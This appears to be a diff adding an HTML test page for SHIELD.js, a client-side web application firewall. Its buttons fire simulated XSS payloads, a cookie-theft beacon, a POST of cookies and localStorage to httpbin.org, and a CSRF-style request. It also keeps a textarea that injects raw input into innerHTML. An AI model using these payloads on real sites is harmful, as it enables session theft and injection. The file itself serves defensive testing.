@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHIELD.js Attack Simulation Tests</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #007acc;
+        }
+        .test-section {
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .test-section h3 {
+            color: #007acc;
+            margin-top: 0;
+        }
+        .test-button {
+            background: #007acc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 14px;
+        }
+        .test-button:hover {
+            background: #005aa3;
+        }
+        .test-button.danger {
+            background: #d32f2f;
+        }
+        .test-button.danger:hover {
+            background: #b71c1c;
+        }
+        .results {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            border-left: 4px solid #007acc;
+        }
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .status.protected {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            color: #2e7d32;
+        }
+        .status.blocked {
+            background: #ffebee;
+            border: 1px solid #f44336;
+            color: #c62828;
+        }
+        .status.warning {
+            background: #fff3e0;
+            border: 1px solid #ff9800;
+            color: #ef6c00;
+        }
+        .attack-payload {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+        }
+        .dashboard {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 300px;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .dashboard h4 {
+            margin-top: 0;
+            color: #007acc;
+        }
+        .threat-log {
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .threat-item {
+            padding: 5px;
+            margin: 5px 0;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+        .threat-item.blocked {
+            background: #ffebee;
+            border-left: 3px solid #f44336;
+        }
+        .threat-item.allowed {
+            background: #e8f5e8;
+            border-left: 3px solid #4caf50;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        .stat {
+            text-align: center;
+            flex: 1;
+        }
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #007acc;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <h4>SHIELD.js Dashboard</h4>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number" id="threats-blocked">0</div>
+                <div class="stat-label">Blocked</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number" id="threats-detected">0</div>
+                <div class="stat-label">Detected</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number" id="protection-score">100</div>
+                <div class="stat-label">Score</div>
+            </div>
+        </div>
+        <div class="threat-log" id="threat-log">
+            <div class="threat-item allowed">SHIELD.js protection active</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <h1> SHIELD.js Attack Simulation Tests</h1>
+            <p>Comprehensive testing suite for client-side web application firewall</p>
+            <div class="status protected" id="shield-status">
+                Initializing SHIELD.js protection...
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Basic XSS Tests</h3>
+            <p>Test basic cross-site scripting attack vectors</p>
+
+            <button class="test-button" onclick="runBasicXSS()">Basic Alert Test</button>
+            <button class="test-button" onclick="runImageXSS()">Image XSS</button>
+            <button class="test-button" onclick="runIframeXSS()">Iframe XSS</button>
+            <button class="test-button" onclick="runScriptTagXSS()">Script Tag XSS</button>
+
+            <div class="results" id="basic-xss-results">
+                <strong>Results:</strong> Click buttons above to test basic XSS protection
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Advanced XSS Payloads</h3>
+            <p>Test sophisticated XSS attack techniques</p>
+
+            <button class="test-button danger" onclick="runCookieTheft()">Cookie Theft</button>
+            <button class="test-button danger" onclick="runFormHijacking()">Form Hijacking</button>
+            <button class="test-button danger" onclick="runDOMBasedXSS()">DOM-based XSS</button>
+            <button class="test-button danger" onclick="runEventHandlerXSS()">Event Handler XSS</button>
+
+            <div class="results" id="advanced-xss-results">
+                <strong>Results:</strong> Click buttons above to test advanced XSS protection
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>DOM Manipulation Tests</h3>
+            <p>Test DOM-based attacks and manipulations</p>
+
+            <button class="test-button" onclick="runInnerHTMLInjection()">innerHTML Injection</button>
+            <button class="test-button" onclick="runOuterHTMLInjection()">outerHTML Injection</button>
+            <button class="test-button" onclick="runInsertAdjacentHTML()">insertAdjacentHTML</button>
+            <button class="test-button" onclick="runDocumentWrite()">document.write</button>
+
+            <div class="results" id="dom-results">
+                <strong>Results:</strong> Click buttons above to test DOM protection
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Behavioral Analysis Tests</h3>
+            <p>Test AI behavioral learning and anomaly detection</p>
+
+            <button class="test-button" onclick="runRapidClicks()">Rapid Clicking</button>
+            <button class="test-button" onclick="runFormSpam()">Form Spam</button>
+            <button class="test-button" onclick="runUnusualNavigation()">Unusual Navigation</button>
+            <button class="test-button" onclick="runTimingAttack()">Timing Attack</button>
+
+            <div class="results" id="behavior-results">
+                <strong>Results:</strong> Click buttons above to test behavioral analysis
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Network Interception Tests</h3>
+            <p>Test request/response interception and analysis</p>
+
+            <button class="test-button" onclick="runSuspiciousRequest()">Suspicious Request</button>
+            <button class="test-button" onclick="runDataExfiltration()">Data Exfiltration</button>
+            <button class="test-button" onclick="runMaliciousRedirect()">Malicious Redirect</button>
+            <button class="test-button" onclick="runCSRFAttempt()">CSRF Attempt</button>
+
+            <div class="results" id="network-results">
+                <strong>Results:</strong> Click buttons above to test network protection
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Performance Tests</h3>
+            <p>Test performance impact and efficiency</p>
+
+            <button class="test-button" onclick="runPerformanceTest()">Load Performance Test</button>
+            <button class="test-button" onclick="runMemoryTest()">Memory Usage Test</button>
+            <button class="test-button" onclick="runCPUTest()">CPU Usage Test</button>
+
+            <div class="results" id="performance-results">
+                <strong>Results:</strong> Click buttons above to test performance
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>Custom Test Payload</h3>
+            <p>Enter your own test payload</p>
+
+            <textarea id="custom-payload" rows="4" cols="50" placeholder="Enter custom XSS or attack payload here..."></textarea><br><br>
+            <button class="test-button" onclick="runCustomPayload()">Test Custom Payload</button>
+
+            <div class="results" id="custom-results">
+                <strong>Results:</strong> Enter a payload above and click test
+            </div>
+        </div>
+    </div>
+
+    <!-- Load SHIELD.js -->
+    <script src="../dist/shield-firewall.min.js"></script>
+
+    <script>
+        let shield;
+        let threatCount = 0;
+        let blockedCount = 0;
+
+        // Initialize SHIELD.js
+        async function initializeShield() {1        
+            try {
+                shield = new ShieldFirewall();
+
+                await shield.configure({
+                    protectionLevel: 'strict',
+                    features: {
+                        domProtection: true,
+                        networkInterception: true,
+                        behaviorAnalysis: true,
+                        predictiveDetection: true,
+                        autoRecovery: true
+                    },
+                    threatDetection: {
+                        sensitivity: 0.8,
+                        customPatterns: [
+                            'script.*alert',
+                            'onerror.*alert',
+                            'javascript:',
+                            'cookie.*steal',
+                            'document\\.cookie'
+                        ]
+                    }
+                });
+
+                await shield.initialize();
+                await shield.start();
+
+                document.getElementById('shield-status').textContent = 'SHIELD.js protection active and monitoring';
+                document.getElementById('shield-status').className = 'status protected';
+
+                // Listen for threat events
+                document.addEventListener('shield:threat-detected', handleThreatDetected);
+                document.addEventListener('shield:threat-blocked', handleThreatBlocked);
+
+                console.log('SHIELD.js initialized successfully');
+            } catch (error) {
+                console.error('Failed to initialize SHIELD.js:', error);
+                document.getElementById('shield-status').textContent = 'SHIELD.js initialization failed';
+                document.getElementById('shield-status').className = 'status blocked';
+            }
+        }
+
+        function handleThreatDetected(event) {
+            const threat = event.detail;
+            threatCount++;
+            updateDashboard();
+
+            const logEntry = document.createElement('div');
+            logEntry.className = 'threat-item blocked';
+            logEntry.textContent = `${new Date().toLocaleTimeString()}: ${threat.type} - ${threat.severity}`;
+            document.getElementById('threat-log').prepend(logEntry);
+        }
+
+        function handleThreatBlocked(event) {
+            blockedCount++;
+            updateDashboard();
+        }
+
+        function updateDashboard() {
+            document.getElementById('threats-detected').textContent = threatCount;
+            document.getElementById('threats-blocked').textContent = blockedCount;
+            const score = Math.max(0, 100 - (threatCount * 5));
+            document.getElementById('protection-score').textContent = score;
+        }
+
+        function logResult(elementId, message, type = 'info') {
+            const resultsDiv = document.getElementById(elementId);
+            const resultEntry = document.createElement('div');
+            resultEntry.className = `status ${type}`;
+            resultEntry.textContent = `${new Date().toLocaleTimeString()}: ${message}`;
+            resultsDiv.appendChild(resultEntry);
+        }
+
+        // Basic XSS Tests
+        function runBasicXSS() {
+            try {
+                // This should be blocked by SHIELD.js
+                const maliciousScript = document.createElement('script');
+                maliciousScript.textContent = 'alert("XSS Attack!")';
+                document.body.appendChild(maliciousScript);
+
+                logResult('basic-xss-results', 'Basic XSS test completed - check if alert appeared', 'warning');
+            } catch (error) {
+                logResult('basic-xss-results', `Basic XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runImageXSS() {
+            try {
+                const img = document.createElement('img');
+                img.src = 'x';
+                img.onerror = () => alert('XSS via image!');
+                document.body.appendChild(img);
+
+                logResult('basic-xss-results', 'Image XSS test completed', 'warning');
+            } catch (error) {
+                logResult('basic-xss-results', `Image XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runIframeXSS() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = 'javascript:alert("XSS via iframe!")';
+                document.body.appendChild(iframe);
+
+                logResult('basic-xss-results', 'Iframe XSS test completed', 'warning');
+            } catch (error) {
+                logResult('basic-xss-results', `Iframe XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runScriptTagXSS() {
+            try {
+                const script = document.createElement('script');
+                script.src = 'data:text/javascript,alert("XSS via script tag!")';
+                document.body.appendChild(script);
+
+                logResult('basic-xss-results', 'Script tag XSS test completed', 'warning');
+            } catch (error) {
+                logResult('basic-xss-results', `Script tag XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        // Advanced XSS Tests
+        function runCookieTheft() {
+            try {
+                // Simulate cookie theft attempt
+                const img = new Image();
+                img.src = 'https://httpbin.org/get?cookie=' + encodeURIComponent(document.cookie);
+                logResult('advanced-xss-results', 'Cookie theft attempt simulated', 'warning');
+            } catch (error) {
+                logResult('advanced-xss-results', `Cookie theft blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runFormHijacking() {
+            try {
+                const forms = document.querySelectorAll('form');
+                if (forms.length > 0) {
+                    const originalSubmit = forms[0].onsubmit;
+                    forms[0].onsubmit = function() {
+                        alert('Form hijacked!');
+                        return false;
+                    };
+                    logResult('advanced-xss-results', 'Form hijacking test completed', 'warning');
+                } else {
+                    logResult('advanced-xss-results', 'No forms found to test', 'warning');
+                }
+            } catch (error) {
+                logResult('advanced-xss-results', `Form hijacking blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runDOMBasedXSS() {
+            try {
+                const div = document.createElement('div');
+                div.innerHTML = '<img src=x onerror="alert(\'DOM-based XSS!\')">';
+                document.body.appendChild(div);
+
+                logResult('advanced-xss-results', 'DOM-based XSS test completed', 'warning');
+            } catch (error) {
+                logResult('advanced-xss-results', `DOM-based XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runEventHandlerXSS() {
+            try {
+                const button = document.createElement('button');
+                button.setAttribute('onclick', 'alert("Event handler XSS!")');
+                button.textContent = 'Click me';
+                document.body.appendChild(button);
+
+                logResult('advanced-xss-results', 'Event handler XSS test completed', 'warning');
+            } catch (error) {
+                logResult('advanced-xss-results', `Event handler XSS blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        // DOM Manipulation Tests
+        function runInnerHTMLInjection() {
+            try {
+                const testDiv = document.createElement('div');
+                testDiv.innerHTML = '<script>alert("innerHTML injection!")<\/script><p>Safe content</p>';
+                document.body.appendChild(testDiv);
+
+                logResult('dom-results', 'innerHTML injection test completed', 'warning');
+            } catch (error) {
+                logResult('dom-results', `innerHTML injection blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runOuterHTMLInjection() {
+            try {
+                const testDiv = document.createElement('div');
+                document.body.appendChild(testDiv);
+                testDiv.outerHTML = '<div><script>alert("outerHTML injection!")</script></div>';
+
+                logResult('dom-results', 'outerHTML injection test completed', 'warning');
+            } catch (error) {
+                logResult('dom-results', `outerHTML injection blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runInsertAdjacentHTML() {
+            try {
+                const testDiv = document.createElement('div');
+                document.body.appendChild(testDiv);
+                testDiv.insertAdjacentHTML('beforeend', '<script>alert("insertAdjacentHTML injection!")</script>');
+
+                logResult('dom-results', 'insertAdjacentHTML injection test completed', 'warning');
+            } catch (error) {
+                logResult('dom-results', `insertAdjacentHTML injection blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runDocumentWrite() {
+            try {
+                document.write('<script>alert("document.write injection!")</script>');
+
+                logResult('dom-results', 'document.write injection test completed', 'warning');
+            } catch (error) {
+                logResult('dom-results', `document.write injection blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        // Behavioral Analysis Tests
+        function runRapidClicks() {
+            let clickCount = 0;
+            const clickInterval = setInterval(() => {
+                const event = new MouseEvent('click', {
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: Math.random() * window.innerWidth,
+                    clientY: Math.random() * window.innerHeight
+                });
+                document.body.dispatchEvent(event);
+                clickCount++;
+
+                if (clickCount >= 50) {
+                    clearInterval(clickInterval);
+                    logResult('behavior-results', 'Rapid clicking test completed (50 clicks)', 'warning');
+                }
+            }, 10);
+        }
+
+        function runFormSpam() {
+            const spamInterval = setInterval(() => {
+                const form = document.createElement('form');
+                form.innerHTML = '<input type="text" value="spam content">';
+                document.body.appendChild(form);
+                form.submit();
+
+                setTimeout(() => {
+                    if (form.parentNode) {
+                        form.parentNode.removeChild(form);
+                    }
+                }, 100);
+            }, 50);
+
+            setTimeout(() => {
+                clearInterval(spamInterval);
+                logResult('behavior-results', 'Form spam test completed', 'warning');
+            }, 2000);
+        }
+
+        function runUnusualNavigation() {
+            // Simulate unusual navigation patterns
+            const pages = ['page1.html', 'page2.html', 'page3.html', 'page4.html', 'page5.html'];
+            let navCount = 0;
+
+            const navInterval = setInterval(() => {
+                // Simulate rapid page navigation
+                history.pushState({}, '', pages[navCount % pages.length]);
+                navCount++;
+
+                if (navCount >= 20) {
+                    clearInterval(navInterval);
+                    logResult('behavior-results', 'Unusual navigation test completed', 'warning');
+                }
+            }, 100);
+        }
+
+        function runTimingAttack() {
+            // Simulate timing attack patterns
+            const startTime = performance.now();
+
+            // Perform many DOM operations quickly
+            for (let i = 0; i < 1000; i++) {
+                const div = document.createElement('div');
+                div.textContent = 'Timing test ' + i;
+                document.body.appendChild(div);
+
+                // Remove immediately to avoid DOM bloat
+                setTimeout(() => {
+                    if (div.parentNode) {
+                        div.parentNode.removeChild(div);
+                    }
+                }, 1);
+            }
+
+            const endTime = performance.now();
+            logResult('behavior-results', `Timing attack test completed in ${(endTime - startTime).toFixed(2)}ms`, 'warning');
+        }
+
+        // Network Interception Tests
+        function runSuspiciousRequest() {
+            fetch('https://httpbin.org/get?suspicious=parameter&inject=<script>alert(1)</script>')
+                .then(response => response.json())
+                .then(data => {
+                    logResult('network-results', 'Suspicious request completed', 'warning');
+                })
+                .catch(error => {
+                    logResult('network-results', `Suspicious request blocked: ${error.message}`, 'protected');
+                });
+        }
+
+        function runDataExfiltration() {
+            const data = {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                userAgent: navigator.userAgent
+            };
+
+            fetch('https://httpbin.org/post', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                logResult('network-results', 'Data exfiltration attempt completed', 'warning');
+            })
+            .catch(error => {
+                logResult('network-results', `Data exfiltration blocked: ${error.message}`, 'protected');
+            });
+        }
+
+        function runMaliciousRedirect() {
+            try {
+                window.location.href = 'javascript:alert("Malicious redirect!")';
+                logResult('network-results', 'Malicious redirect test completed', 'warning');
+            } catch (error) {
+                logResult('network-results', `Malicious redirect blocked: ${error.message}`, 'protected');
+            }
+        }
+
+        function runCSRFAttempt() {
+            fetch('https://httpbin.org/post', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'action=transfer&amount=1000&to=attacker'
+            })
+            .then(response => response.json())
+            .then(data => {
+                logResult('network-results', 'CSRF attempt completed', 'warning');
+            })
+            .catch(error => {
+                logResult('network-results', `CSRF attempt blocked: ${error.message}`, 'protected');
+            });
+        }
+
+        // Performance Tests
+        function runPerformanceTest() {
+            const startTime = performance.now();
+
+            // Simulate page load with SHIELD.js
+            setTimeout(() => {
+                const loadTime = performance.now() - startTime;
+                const status = loadTime < 100 ? 'protected' : 'warning';
+                logResult('performance-results', `Page load time: ${loadTime.toFixed(2)}ms`, status);
+            }, 10);
+        }
+
+        function runMemoryTest() {
+            if ('memory' in performance) {
+                const memInfo = performance.memory;
+                const usedMB = (memInfo.usedJSHeapSize / 1024 / 1024).toFixed(2);
+                const totalMB = (memInfo.totalJSHeapSize / 1024 / 1024).toFixed(2);
+
+                logResult('performance-results', `Memory usage: ${usedMB}MB used of ${totalMB}MB total`, 'info');
+            } else {
+                logResult('performance-results', 'Memory monitoring not available in this browser', 'warning');
+            }
+        }
+
+        function runCPUTest() {
+            // Simple CPU usage estimation
+            const startTime = performance.now();
+            let operations = 0;
+
+            for (let i = 0; i < 1000000; i++) {
+                operations += Math.sqrt(i);
+            }
+
+            const endTime = performance.now();
+            const cpuTime = endTime - startTime;
+
+            logResult('performance-results', `CPU test completed in ${cpuTime.toFixed(2)}ms`, 'info');
+        }
+
+        // Custom Payload Test
+        function runCustomPayload() {
+            const payload = document.getElementById('custom-payload').value.trim();
+
+            if (!payload) {
+                logResult('custom-results', 'Please enter a payload to test', 'warning');
+                return;
+            }
+
+            try {
+                // Attempt to execute the payload
+                const testDiv = document.createElement('div');
+                testDiv.innerHTML = payload;
+                document.body.appendChild(testDiv);
+
+                logResult('custom-results', 'Custom payload test completed - check for any alerts or unexpected behavior', 'warning');
+
+                // Clean up
+                setTimeout(() => {
+                    if (testDiv.parentNode) {
+                        testDiv.parentNode.removeChild(testDiv);
+                    }
+                }, 1000);
+
+            } catch (error) {
+                logResult('custom-results', `Custom payload blocked: ${error.message}`, 'protected');
+            }
+        }
+        // Initialize when page loads
+        window.addEventListener('load', initializeShield);
+    </script>
+</body>
+</html>
